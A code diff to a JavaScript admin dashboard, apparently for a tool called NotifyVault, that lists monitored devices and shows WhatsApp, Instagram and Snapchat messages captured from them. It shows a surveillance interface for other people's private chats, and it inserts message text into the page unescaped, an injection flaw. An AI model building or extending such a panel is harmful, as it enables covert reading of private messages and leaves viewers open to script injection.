@@ -1,4 +1,4 @@
-const state = { token: localStorage.getItem('nv_admin_token') || '', backend: 'http://localhost:4000' };
+const state = { token: localStorage.getItem('nv_admin_token') || '', backend: 'https://notifyvault-theta.vercel.app' };
 const el = (id) => document.getElementById(id);
 
 const formatNumber = (value) => Number(value || 0).toLocaleString();
@@ -7,6 +7,20 @@ const formatDate = (value) => {
   const date = new Date(value);
   if (Number.isNaN(date.getTime())) return '—';
   return new Intl.DateTimeFormat('en', { dateStyle: 'medium', timeStyle: 'short' }).format(date);
+};
+
+const getAppBadge = (pkg) => {
+  const source = (pkg || '').toLowerCase();
+  if (source.includes('whatsapp')) {
+    return `<span class="app-badge whatsapp">WhatsApp</span>`;
+  }
+  if (source.includes('instagram')) {
+    return `<span class="app-badge instagram">Instagram</span>`;
+  }
+  if (source.includes('snapchat')) {
+    return `<span class="app-badge snapchat">Snapchat</span>`;
+  }
+  return `<span class="app-badge other">${pkg ? pkg.split('.').pop() : 'App'}</span>`;
 };
 
 async function api(path, options = {}) {
@@ -67,7 +81,7 @@ async function renderDashboard() {
     const [summary, devices, messages] = await Promise.all([
       api('/api/admin/dashboard'),
       api('/api/admin/devices'),
-      api('/api/admin/messages?limit=30')
+      api('/api/admin/messages?limit=100')
     ]);
 
     const summaryCards = [
@@ -75,8 +89,7 @@ async function renderDashboard() {
       { label: 'Online Devices', value: formatNumber(summary.onlineDevices || 0), tone: 'success' },
       { label: 'Offline Devices', value: formatNumber(summary.offlineDevices || 0), tone: 'warning' },
       { label: 'Total Messages', value: formatNumber(summary.totalSynchronizedMessages || 0), tone: 'info' },
-      { label: "Today's Messages", value: formatNumber(summary.todaysMessages || 0), tone: 'primary' },
-      { label: 'Pending Sync', value: '—', tone: 'neutral' }
+      { label: "Today's Messages", value: formatNumber(summary.todaysMessages || 0), tone: 'primary' }
     ];
 
     const renderTable = (rows) => rows.length ? rows : [{ empty: true }];
@@ -86,7 +99,7 @@ async function renderDashboard() {
         <header class="topbar">
           <div>
             <div class="eyebrow">Operations</div>
-            <h1>Admin Dashboard</h1>
+            <h1>NotifyVault Admin Dashboard</h1>
           </div>
           <button class="secondary" id="logoutBtn">Logout</button>
         </header>
@@ -103,18 +116,18 @@ async function renderDashboard() {
         <section class="panel-grid">
           <div class="card panel-card">
             <div class="panel-header">
-              <h2>Devices</h2>
-              <span class="chip neutral">${(devices.devices || []).length} tracked</span>
+              <h2>Monitored Devices</h2>
+              <span class="chip neutral">${(devices.devices || []).length} registered</span>
             </div>
             <div class="table-wrap">
               <table>
                 <thead>
-                  <tr><th>Device</th><th>Online</th><th>Last seen</th><th>Last sync</th><th>Status</th></tr>
+                  <tr><th>Device Name</th><th>Online</th><th>Last Seen</th><th>Last Sync</th><th>Status</th></tr>
                 </thead>
                 <tbody>
                   ${(renderTable(devices.devices || [])).map(device => device.empty ? '<tr><td colspan="5">No devices registered</td></tr>' : `
                     <tr>
-                      <td>${device.deviceName || device.deviceId}</td>
+                      <td><strong>${device.deviceName || device.deviceId}</strong></td>
                       <td><span class="status-pill ${device.online ? 'online' : 'offline'}">${device.online ? 'Online' : 'Offline'}</span></td>
                       <td>${formatDate(device.lastSeen)}</td>
                       <td>${formatDate(device.lastSync)}</td>
@@ -128,20 +141,21 @@ async function renderDashboard() {
 
           <div class="card panel-card">
             <div class="panel-header">
-              <h2>Recent Messages</h2>
-              <span class="chip info">${(messages.messages || []).length} shown</span>
+              <h2>Synchronized Messages (All Devices & Apps)</h2>
+              <span class="chip info">${(messages.messages || []).length} captured</span>
             </div>
             <div class="table-wrap">
               <table>
                 <thead>
-                  <tr><th>Sender</th><th>Device</th><th>Message</th><th>Captured</th></tr>
+                  <tr><th>App</th><th>Device Name</th><th>Sender</th><th>Message Text</th><th>Captured Time</th></tr>
                 </thead>
                 <tbody>
-                  ${(renderTable(messages.messages || [])).map(msg => msg.empty ? '<tr><td colspan="4">No messages</td></tr>' : `
+                  ${(renderTable(messages.messages || [])).map(msg => msg.empty ? '<tr><td colspan="5">No messages captured yet</td></tr>' : `
                     <tr>
+                      <td>${getAppBadge(msg.sourcePackage || msg.sourceType)}</td>
+                      <td><strong>${msg.deviceName || msg.deviceId || 'Device'}</strong></td>
                       <td>${msg.sender || 'Unknown'}</td>
-                      <td>${msg.deviceId || 'device'}</td>
-                      <td>${(msg.messageText || '').slice(0, 80)}</td>
+                      <td>${(msg.messageText || '').slice(0, 100)}</td>
                       <td>${formatDate(msg.capturedAt)}</td>
                     </tr>
                   `).join('')}
@@ -158,20 +172,18 @@ async function renderDashboard() {
       const data = JSON.parse(event.data || '{}');
       if (data.type === 'new_message') {
         try {
-          const refreshed = await api('/api/admin/messages?limit=30');
-          const rows = document.querySelectorAll('tbody tr');
-          if (rows.length) {
-            const table = rows[0].closest('table');
-            if (table) {
-              table.tBodies[0].innerHTML = (refreshed.messages || []).map(msg => `
-                <tr>
-                  <td>${msg.sender || 'Unknown'}</td>
-                  <td>${msg.deviceId || 'device'}</td>
-                  <td>${(msg.messageText || '').slice(0, 80)}</td>
-                  <td>${formatDate(msg.capturedAt)}</td>
-                </tr>
-              `).join('') || '<tr><td colspan="4">No messages</td></tr>';
-            }
+          const refreshed = await api('/api/admin/messages?limit=100');
+          const tables = document.querySelectorAll('table');
+          if (tables.length > 1) {
+            tables[1].tBodies[0].innerHTML = (refreshed.messages || []).map(msg => `
+              <tr>
+                <td>${getAppBadge(msg.sourcePackage || msg.sourceType)}</td>
+                <td><strong>${msg.deviceName || msg.deviceId || 'Device'}</strong></td>
+                <td>${msg.sender || 'Unknown'}</td>
+                <td>${(msg.messageText || '').slice(0, 100)}</td>
+                <td>${formatDate(msg.capturedAt)}</td>
+              </tr>
+            `).join('') || '<tr><td colspan="5">No messages captured yet</td></tr>';
           }
         } catch (_) {}
       }
